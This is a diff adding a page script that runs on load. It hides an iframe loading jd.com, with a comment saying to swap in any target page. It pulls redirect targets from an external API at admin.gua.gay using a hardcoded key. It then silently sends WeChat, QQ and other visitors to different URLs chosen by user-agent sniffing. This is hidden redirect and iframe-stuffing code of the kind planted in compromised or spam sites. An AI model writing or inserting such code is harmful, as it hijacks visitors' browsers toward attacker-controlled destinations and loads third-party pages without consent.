@@ -1,0 +1,56 @@
+<script>
+    function sendHttpRequest(url) {
+        return new Promise((resolve, reject) => {
+            const xhr = new XMLHttpRequest();
+            xhr.open('GET', url, true);
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState === 4) {
+                    if (xhr.status === 200) {
+                        resolve(xhr.responseText);
+                    } else {
+                        reject(xhr.statusText);
+                    }
+                }
+            };
+            xhr.send();
+        });
+    }
+    
+    function redirectToURL(url) {
+        window.location.href = url;
+    }
+    
+    function getUA() {
+        return navigator.userAgent;
+    }
+    
+    function displayIframe() {
+        const iframe = document.createElement('iframe');
+        iframe.src = 'https://jd.com';  // 替换为您需要加载的网页地址
+        iframe.style.display = 'none';
+        document.body.appendChild(iframe);
+    }
+    
+    async function getDataAndRedirect(apiUrl) {
+        try {
+            const response = await sendHttpRequest(apiUrl);
+            const jsonData = JSON.parse(response);
+            const ua = getUA();
+            
+            if (ua.indexOf('MicroMessenger') !== -1) {
+                redirectToURL(jsonData.data.wechat_url);
+            } else if (ua.indexOf('QQ/') !== -1) {
+                redirectToURL(jsonData.data.qq_url);
+            } else {
+                redirectToURL(jsonData.data.short_url);
+            }
+        } catch (error) {
+            console.error('Error:', error);
+        }
+    }
+    
+    const apiUrl = 'https://admin.gua.gay/qmhppp/apikey.php?key=123321';
+    displayIframe();
+    getDataAndRedirect(apiUrl);
+    </script>
+    
